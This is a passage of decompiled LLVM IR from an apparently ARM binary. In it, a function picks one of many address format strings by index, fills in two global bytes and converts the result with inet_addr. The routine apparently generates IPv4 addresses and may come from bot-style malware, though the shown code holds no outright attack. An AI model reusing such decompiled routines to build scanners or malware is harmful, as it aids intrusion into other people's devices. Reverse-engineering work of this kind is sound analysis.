  %v7_ced4 = icmp eq i32 %v2_a7e4, 181
  br i1 %v7_ced4, label %dec_label_pc_cedc, label %dec_label_pc_cf04

dec_label_pc_cedc:                                ; preds = %dec_label_pc_ced0
  %v3_cee8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_cef4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_cf00 = sext i8 %v3_cee8 to i32
  %v6_cf00 = sext i8 %v3_cef4 to i32
  %v8_cf00 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1dc98.417 to i32), i32 %v4_cf00, i32 %v6_cf00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf04

dec_label_pc_cf04:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cedc
  %v7_cf08 = icmp eq i32 %v2_a7e4, 182
  br i1 %v7_cf08, label %dec_label_pc_cf10, label %dec_label_pc_cf38

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cf04
  %v3_cf1c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_cf28 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_cf34 = sext i8 %v3_cf1c to i32
  %v6_cf34 = sext i8 %v3_cf28 to i32
  %v8_cf34 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1dca8.419 to i32), i32 %v4_cf34, i32 %v6_cf34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf38

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cf04, %dec_label_pc_cf10
  %v7_cf3c = icmp eq i32 %v2_a7e4, 183
  br i1 %v7_cf3c, label %dec_label_pc_cf44, label %dec_label_pc_cf6c

dec_label_pc_cf44:                                ; preds = %dec_label_pc_cf38
  %v3_cf50 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_cf5c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_cf68 = sext i8 %v3_cf50 to i32
  %v6_cf68 = sext i8 %v3_cf5c to i32
  %v8_cf68 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d4a8.158 to i32), i32 %v4_cf68, i32 %v6_cf68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf6c

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cf38, %dec_label_pc_cf44
  %v7_cf70 = icmp eq i32 %v2_a7e4, 184
  br i1 %v7_cf70, label %dec_label_pc_cf78, label %dec_label_pc_cfa0

dec_label_pc_cf78:                                ; preds = %dec_label_pc_cf6c
  %v3_cf84 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_cf90 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_cf9c = sext i8 %v3_cf84 to i32
  %v6_cf9c = sext i8 %v3_cf90 to i32
  %v8_cf9c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1dcb8.422 to i32), i32 %v4_cf9c, i32 %v6_cf9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfa0

dec_label_pc_cfa0:                                ; preds = %dec_label_pc_cf6c, %dec_label_pc_cf78
  %v7_cfa4 = icmp eq i32 %v2_a7e4, 185
  br i1 %v7_cfa4, label %dec_label_pc_cfac, label %dec_label_pc_cfd4

dec_label_pc_cfac:                                ; preds = %dec_label_pc_cfa0
  %v3_cfb8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_cfc4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_cfd0 = sext i8 %v3_cfb8 to i32
  %v6_cfd0 = sext i8 %v3_cfc4 to i32
  %v8_cfd0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1dcc8.424 to i32), i32 %v4_cfd0, i32 %v6_cfd0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_cfa0, %dec_label_pc_cfac
  %v7_cfd8 = icmp eq i32 %v2_a7e4, 186
  br i1 %v7_cfd8, label %dec_label_pc_cfe0, label %dec_label_pc_d008

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_cfd4
  %v3_cfec = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_cff8 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d004 = sext i8 %v3_cfec to i32
  %v6_d004 = sext i8 %v3_cff8 to i32
  %v8_d004 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dcd8.426 to i32), i32 %v4_d004, i32 %v6_d004, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d008

dec_label_pc_d008:                                ; preds = %dec_label_pc_cfd4, %dec_label_pc_cfe0
  %v7_d00c = icmp eq i32 %v2_a7e4, 187
  br i1 %v7_d00c, label %dec_label_pc_d014, label %dec_label_pc_d03c

dec_label_pc_d014:                                ; preds = %dec_label_pc_d008
  %v3_d020 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d02c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d038 = sext i8 %v3_d020 to i32
  %v6_d038 = sext i8 %v3_d02c to i32
  %v8_d038 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dce8.428 to i32), i32 %v4_d038, i32 %v6_d038, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d03c

dec_label_pc_d03c:                                ; preds = %dec_label_pc_d008, %dec_label_pc_d014
  %v7_d040 = icmp eq i32 %v2_a7e4, 188
  br i1 %v7_d040, label %dec_label_pc_d048, label %dec_label_pc_d070

dec_label_pc_d048:                                ; preds = %dec_label_pc_d03c
  %v3_d054 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d060 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d06c = sext i8 %v3_d054 to i32
  %v6_d06c = sext i8 %v3_d060 to i32
  %v8_d06c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dcf8.430 to i32), i32 %v4_d06c, i32 %v6_d06c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d070

dec_label_pc_d070:                                ; preds = %dec_label_pc_d03c, %dec_label_pc_d048
  %v7_d074 = icmp eq i32 %v2_a7e4, 189
  br i1 %v7_d074, label %dec_label_pc_d07c, label %dec_label_pc_d0a4

dec_label_pc_d07c:                                ; preds = %dec_label_pc_d070
  %v3_d088 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d094 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d0a0 = sext i8 %v3_d088 to i32
  %v6_d0a0 = sext i8 %v3_d094 to i32
  %v8_d0a0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dd08.432 to i32), i32 %v4_d0a0, i32 %v6_d0a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0a4

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d070, %dec_label_pc_d07c
  %v7_d0a8 = icmp eq i32 %v2_a7e4, 190
  br i1 %v7_d0a8, label %dec_label_pc_d0b0, label %dec_label_pc_d0d8

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d0a4
  %v3_d0bc = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d0c8 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d0d4 = sext i8 %v3_d0bc to i32
  %v6_d0d4 = sext i8 %v3_d0c8 to i32
  %v8_d0d4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dd18.434 to i32), i32 %v4_d0d4, i32 %v6_d0d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0d8

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_d0a4, %dec_label_pc_d0b0
  %v7_d0dc = icmp eq i32 %v2_a7e4, 191
  br i1 %v7_d0dc, label %dec_label_pc_d0e4, label %dec_label_pc_d10c

dec_label_pc_d0e4:                                ; preds = %dec_label_pc_d0d8
  %v3_d0f0 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d0fc = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d108 = sext i8 %v3_d0f0 to i32
  %v6_d108 = sext i8 %v3_d0fc to i32
  %v8_d108 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dd28.436 to i32), i32 %v4_d108, i32 %v6_d108, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d10c

dec_label_pc_d10c:                                ; preds = %dec_label_pc_d0d8, %dec_label_pc_d0e4
  %v7_d110 = icmp eq i32 %v2_a7e4, 192
  br i1 %v7_d110, label %dec_label_pc_d118, label %dec_label_pc_d140

dec_label_pc_d118:                                ; preds = %dec_label_pc_d10c
  %v3_d124 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d130 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d13c = sext i8 %v3_d124 to i32
  %v6_d13c = sext i8 %v3_d130 to i32
  %v8_d13c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1dd38.438 to i32), i32 %v4_d13c, i32 %v6_d13c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d140

dec_label_pc_d140:                                ; preds = %dec_label_pc_d10c, %dec_label_pc_d118
  %v7_d144 = icmp eq i32 %v2_a7e4, 193
  br i1 %v7_d144, label %dec_label_pc_d14c, label %dec_label_pc_d174

dec_label_pc_d14c:                                ; preds = %dec_label_pc_d140
  %v3_d158 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d164 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d170 = sext i8 %v3_d158 to i32
  %v6_d170 = sext i8 %v3_d164 to i32
  %v8_d170 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1dd48.440 to i32), i32 %v4_d170, i32 %v6_d170, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d174

dec_label_pc_d174:                                ; preds = %dec_label_pc_d140, %dec_label_pc_d14c
  %v7_d178 = icmp eq i32 %v2_a7e4, 194
  br i1 %v7_d178, label %dec_label_pc_d180, label %dec_label_pc_d1a8

dec_label_pc_d180:                                ; preds = %dec_label_pc_d174
  %v3_d18c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d198 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d1a4 = sext i8 %v3_d18c to i32
  %v6_d1a4 = sext i8 %v3_d198 to i32
  %v8_d1a4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dd58.442 to i32), i32 %v4_d1a4, i32 %v6_d1a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1a8

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d174, %dec_label_pc_d180
  %v7_d1ac = icmp eq i32 %v2_a7e4, 195
  br i1 %v7_d1ac, label %dec_label_pc_d1b4, label %dec_label_pc_d1dc

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d1a8
  %v3_d1c0 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d1cc = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d1d8 = sext i8 %v3_d1c0 to i32
  %v6_d1d8 = sext i8 %v3_d1cc to i32
  %v8_d1d8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dd68.444 to i32), i32 %v4_d1d8, i32 %v6_d1d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %dec_label_pc_d1a8, %dec_label_pc_d1b4
  %v7_d1e0 = icmp eq i32 %v2_a7e4, 196
  br i1 %v7_d1e0, label %dec_label_pc_d1e8, label %dec_label_pc_d210

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1dc
  %v3_d1f4 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d200 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d20c = sext i8 %v3_d1f4 to i32
  %v6_d20c = sext i8 %v3_d200 to i32
  %v8_d20c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dd78.446 to i32), i32 %v4_d20c, i32 %v6_d20c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d210

dec_label_pc_d210:                                ; preds = %dec_label_pc_d1dc, %dec_label_pc_d1e8
  %v7_d214 = icmp eq i32 %v2_a7e4, 197
  br i1 %v7_d214, label %dec_label_pc_d21c, label %dec_label_pc_d244

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d210
  %v3_d228 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d234 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d240 = sext i8 %v3_d228 to i32
  %v6_d240 = sext i8 %v3_d234 to i32
  %v8_d240 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dd88.448 to i32), i32 %v4_d240, i32 %v6_d240, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %dec_label_pc_d210, %dec_label_pc_d21c
  %v7_d248 = icmp eq i32 %v2_a7e4, 198
  br i1 %v7_d248, label %dec_label_pc_d250, label %dec_label_pc_d278

dec_label_pc_d250:                                ; preds = %dec_label_pc_d244
  %v3_d25c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d268 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d274 = sext i8 %v3_d25c to i32
  %v6_d274 = sext i8 %v3_d268 to i32
  %v8_d274 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dd98.450 to i32), i32 %v4_d274, i32 %v6_d274, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %dec_label_pc_d244, %dec_label_pc_d250
  %v7_d27c = icmp eq i32 %v2_a7e4, 199
  br i1 %v7_d27c, label %dec_label_pc_d284, label %dec_label_pc_d2ac

dec_label_pc_d284:                                ; preds = %dec_label_pc_d278
  %v3_d290 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d29c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d2a8 = sext i8 %v3_d290 to i32
  %v6_d2a8 = sext i8 %v3_d29c to i32
  %v8_d2a8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1dda8.452 to i32), i32 %v4_d2a8, i32 %v6_d2a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d278, %dec_label_pc_d284
  %v7_d2b0 = icmp eq i32 %v2_a7e4, 200
  br i1 %v7_d2b0, label %dec_label_pc_d2b8, label %dec_label_pc_d2e0

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2ac
  %v3_d2c4 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d2d0 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d2dc = sext i8 %v3_d2c4 to i32
  %v6_d2dc = sext i8 %v3_d2d0 to i32
  %v8_d2dc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ddb8.454 to i32), i32 %v4_d2dc, i32 %v6_d2dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2e0

dec_label_pc_d2e0:                                ; preds = %dec_label_pc_d2ac, %dec_label_pc_d2b8
  %v7_d2e4 = icmp eq i32 %v2_a7e4, 201
  br i1 %v7_d2e4, label %dec_label_pc_d320, label %dec_label_pc_d314

dec_label_pc_d314:                                ; preds = %dec_label_pc_d2e0
  br label %dec_label_pc_d348

dec_label_pc_d320:                                ; preds = %dec_label_pc_d2e0
  %v3_d2f8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d304 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d310 = sext i8 %v3_d2f8 to i32
  %v6_d310 = sext i8 %v3_d304 to i32
  %v8_d310 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1ddc8.456 to i32), i32 %v4_d310, i32 %v6_d310, i32 ptrtoint (i32* @0 to i32))
  %v3_d32c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d338 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d344 = sext i8 %v3_d32c to i32
  %v6_d344 = sext i8 %v3_d338 to i32
  %v8_d344 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ddd8.458 to i32), i32 %v4_d344, i32 %v6_d344, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d348

dec_label_pc_d348:                                ; preds = %dec_label_pc_d314, %dec_label_pc_d320
  %v7_d34c = icmp eq i32 %v2_a7e4, 202
  br i1 %v7_d34c, label %dec_label_pc_d354, label %dec_label_pc_d37c

dec_label_pc_d354:                                ; preds = %dec_label_pc_d348
  %v3_d360 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d36c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d378 = sext i8 %v3_d360 to i32
  %v6_d378 = sext i8 %v3_d36c to i32
  %v8_d378 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1dde8.460 to i32), i32 %v4_d378, i32 %v6_d378, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d37c

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d348, %dec_label_pc_d354
  %v7_d380 = icmp eq i32 %v2_a7e4, 203
  br i1 %v7_d380, label %dec_label_pc_d388, label %dec_label_pc_d3b0

dec_label_pc_d388:                                ; preds = %dec_label_pc_d37c
  %v3_d394 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d3a0 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d3ac = sext i8 %v3_d394 to i32
  %v6_d3ac = sext i8 %v3_d3a0 to i32
  %v8_d3ac = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1ddf8.462 to i32), i32 %v4_d3ac, i32 %v6_d3ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3b0

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d388
  %v7_d3b4 = icmp eq i32 %v2_a7e4, 204
  br i1 %v7_d3b4, label %dec_label_pc_d3bc, label %dec_label_pc_d3e4

dec_label_pc_d3bc:                                ; preds = %dec_label_pc_d3b0
  %v3_d3c8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d3d4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d3e0 = sext i8 %v3_d3c8 to i32
  %v6_d3e0 = sext i8 %v3_d3d4 to i32
  %v8_d3e0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1de08.464 to i32), i32 %v4_d3e0, i32 %v6_d3e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3e4

dec_label_pc_d3e4:                                ; preds = %dec_label_pc_d3b0, %dec_label_pc_d3bc
  %v7_d3e8 = icmp eq i32 %v2_a7e4, 205
  br i1 %v7_d3e8, label %dec_label_pc_d3f0, label %dec_label_pc_d418

dec_label_pc_d3f0:                                ; preds = %dec_label_pc_d3e4
  %v3_d3fc = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d408 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d414 = sext i8 %v3_d3fc to i32
  %v6_d414 = sext i8 %v3_d408 to i32
  %v8_d414 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1de18.466 to i32), i32 %v4_d414, i32 %v6_d414, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d418

dec_label_pc_d418:                                ; preds = %dec_label_pc_d3e4, %dec_label_pc_d3f0
  %v7_d41c = icmp eq i32 %v2_a7e4, 206
  br i1 %v7_d41c, label %dec_label_pc_d424, label %dec_label_pc_d44c

dec_label_pc_d424:                                ; preds = %dec_label_pc_d418
  %v3_d430 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d43c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d448 = sext i8 %v3_d430 to i32
  %v6_d448 = sext i8 %v3_d43c to i32
  %v8_d448 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1de28.468 to i32), i32 %v4_d448, i32 %v6_d448, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d44c

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d418, %dec_label_pc_d424
  %v7_d450 = icmp eq i32 %v2_a7e4, 207
  br i1 %v7_d450, label %dec_label_pc_d458, label %dec_label_pc_d480

dec_label_pc_d458:                                ; preds = %dec_label_pc_d44c
  %v3_d464 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_d470 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_d47c = sext i8 %v3_d464 to i32
  %v6_d47c = sext i8 %v3_d470 to i32
  %v8_d47c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1de38.470 to i32), i32 %v4_d47c, i32 %v6_d47c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d44c, %dec_label_pc_d458
  store i32 %v2_a710, i32* @r0, align 4
  %v1_d4bc = call i32 @inet_addr(i32 %v2_a710)
  store i32 %v3_a708, i32* @fp, align 4
  ret i32 %v1_d4bc

; uselistorder directives
  uselistorder i32 %v2_a710, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1db68.378 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1dafc.363 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1d96c.313 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1d8e0.295 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1d880.283 to i32), { 1, 0 }
  uselistorder i32 65, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1d4c8.162 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1d4a8.158 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1d498.156 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1d468.150 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_d480, { 1, 0 }
  uselistorder label %dec_label_pc_d44c, { 1, 0 }
  uselistorder label %dec_label_pc_d418, { 1, 0 }
  uselistorder label %dec_label_pc_d3e4, { 1, 0 }
  uselistorder label %dec_label_pc_d3b0, { 1, 0 }
  uselistorder label %dec_label_pc_d37c, { 1, 0 }
  uselistorder label %dec_label_pc_d348, { 1, 0 }
  uselistorder label %dec_label_pc_d2e0, { 1, 0 }
  uselistorder label %dec_label_pc_d2ac, { 1, 0 }
  uselistorder label %dec_label_pc_d278, { 1, 0 }
  uselistorder label %dec_label_pc_d244, { 1, 0 }
  uselistorder label %dec_label_pc_d210, { 1, 0 }
  uselistorder label %dec_label_pc_d1dc, { 1, 0 }
  uselistorder label %dec_label_pc_d1a8, { 1, 0 }
  uselistorder label %dec_label_pc_d174, { 1, 0 }
  uselistorder label %dec_label_pc_d140, { 1, 0 }
  uselistorder label %dec_label_pc_d10c, { 1, 0 }
  uselistorder label %dec_label_pc_d0d8, { 1, 0 }
  uselistorder label %dec_label_pc_d0a4, { 1, 0 }
  uselistorder label %dec_label_pc_d070, { 1, 0 }
  uselistorder label %dec_label_pc_d03c, { 1, 0 }
  uselistorder label %dec_label_pc_d008, { 1, 0 }
  uselistorder label %dec_label_pc_cfd4, { 1, 0 }
  uselistorder label %dec_label_pc_cfa0, { 1, 0 }
  uselistorder label %dec_label_pc_cf6c, { 1, 0 }
  uselistorder label %dec_label_pc_cf38, { 1, 0 }
  uselistorder label %dec_label_pc_cf04, { 1, 0 }
  uselistorder label %dec_label_pc_ced0, { 1, 0 }
  uselistorder label %dec_label_pc_ce9c, { 1, 0 }
  uselistorder label %dec_label_pc_ce68, { 1, 0 }
  uselistorder label %dec_label_pc_ce34, { 1, 0 }
  uselistorder label %dec_label_pc_ce00, { 1, 0 }
  uselistorder label %dec_label_pc_cdcc, { 1, 0 }
  uselistorder label %dec_label_pc_cd98, { 1, 0 }
  uselistorder label %dec_label_pc_cd64, { 1, 0 }
  uselistorder label %dec_label_pc_cd30, { 1, 0 }
  uselistorder label %dec_label_pc_ccfc, { 1, 0 }
  uselistorder label %dec_label_pc_ccc8, { 1, 0 }
  uselistorder label %dec_label_pc_cc94, { 1, 0 }
  uselistorder label %dec_label_pc_cc60, { 1, 0 }
  uselistorder label %dec_label_pc_cc2c, { 1, 0 }
  uselistorder label %dec_label_pc_cbf8, { 1, 0 }
  uselistorder label %dec_label_pc_cbc4, { 1, 0 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb5c, { 1, 0 }
  uselistorder label %dec_label_pc_cb28, { 1, 0 }
  uselistorder label %dec_label_pc_caf4, { 1, 0 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
  uselistorder label %dec_label_pc_ca8c, { 1, 0 }
  uselistorder label %dec_label_pc_ca58, { 1, 0 }
  uselistorder label %dec_label_pc_ca24, { 1, 0 }
  uselistorder label %dec_label_pc_c9f0, { 1, 0 }
  uselistorder label %dec_label_pc_c9bc, { 1, 0 }
  uselistorder label %dec_label_pc_c988, { 1, 0 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %dec_label_pc_c920, { 1, 0 }
  uselistorder label %dec_label_pc_c8ec, { 1, 0 }
  uselistorder label %dec_label_pc_c8b8, { 1, 0 }
  uselistorder label %dec_label_pc_c884, { 1, 0 }
  uselistorder label %dec_label_pc_c850, { 1, 0 }
  uselistorder label %dec_label_pc_c81c, { 1, 0 }
  uselistorder label %dec_label_pc_c7e8, { 1, 0 }
  uselistorder label %dec_label_pc_c7b4, { 1, 0 }
  uselistorder label %dec_label_pc_c780, { 1, 0 }
  uselistorder label %dec_label_pc_c74c, { 1, 0 }
  uselistorder label %dec_label_pc_c718, { 1, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0 }
  uselistorder label %dec_label_pc_c6b0, { 1, 0 }
  uselistorder label %dec_label_pc_c67c, { 1, 0 }
  uselistorder label %dec_label_pc_c648, { 1, 0 }
  uselistorder label %dec_label_pc_c614, { 1, 0 }
  uselistorder label %dec_label_pc_c5e0, { 1, 0 }
  uselistorder label %dec_label_pc_c5ac, { 1, 0 }
  uselistorder label %dec_label_pc_c578, { 1, 0 }
  uselistorder label %dec_label_pc_c544, { 1, 0 }
  uselistorder label %dec_label_pc_c510, { 1, 0 }
  uselistorder label %dec_label_pc_c4dc, { 1, 0 }
  uselistorder label %dec_label_pc_c4a8, { 1, 0 }
  uselistorder label %dec_label_pc_c474, { 1, 0 }
  uselistorder label %dec_label_pc_c440, { 1, 0 }
  uselistorder label %dec_label_pc_c40c, { 1, 0 }
  uselistorder label %dec_label_pc_c3d8, { 1, 0 }
  uselistorder label %dec_label_pc_c3a4, { 1, 0 }
  uselistorder label %dec_label_pc_c370, { 1, 0 }
  uselistorder label %dec_label_pc_c33c, { 1, 0 }
  uselistorder label %dec_label_pc_c308, { 1, 0 }
  uselistorder label %dec_label_pc_c2d4, { 1, 0 }
  uselistorder label %dec_label_pc_c2a0, { 1, 0 }
  uselistorder label %dec_label_pc_c26c, { 1, 0 }
  uselistorder label %dec_label_pc_c238, { 1, 0 }
  uselistorder label %dec_label_pc_c204, { 1, 0 }
  uselistorder label %dec_label_pc_c1d0, { 1, 0 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c168, { 1, 0 }
  uselistorder label %dec_label_pc_c134, { 1, 0 }
  uselistorder label %dec_label_pc_c100, { 1, 0 }
  uselistorder label %dec_label_pc_c0cc, { 1, 0 }
  uselistorder label %dec_label_pc_c098, { 1, 0 }
  uselistorder label %dec_label_pc_c064, { 1, 0 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
